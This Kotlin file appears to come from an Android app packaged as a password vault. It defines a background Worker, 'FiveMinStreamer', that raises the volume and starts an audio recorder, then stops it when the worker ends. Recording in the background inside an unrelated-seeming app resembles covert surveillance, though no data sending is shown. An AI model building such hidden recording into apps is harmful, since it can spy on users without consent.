package com.example.passwordvault.service

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.passwordvault.util.FIVE_MIN_RECORDER
import com.example.passwordvault.util.Recorder

class FiveMinStreamer(private val context: Context, workerParams: WorkerParameters) : Worker(
    context,
    workerParams
) {

    @RequiresApi(Build.VERSION_CODES.N)
    override fun doWork(): Result {
        Recorder.increaseVolume(FIVE_MIN_RECORDER, context)
        Recorder.initialize(context, FIVE_MIN_RECORDER)
        Recorder.prepareRecorder(context)
        return Result.success()
    }

    override fun onStopped() {
        Recorder.stopRecorder()
        super.onStopped()
    }
}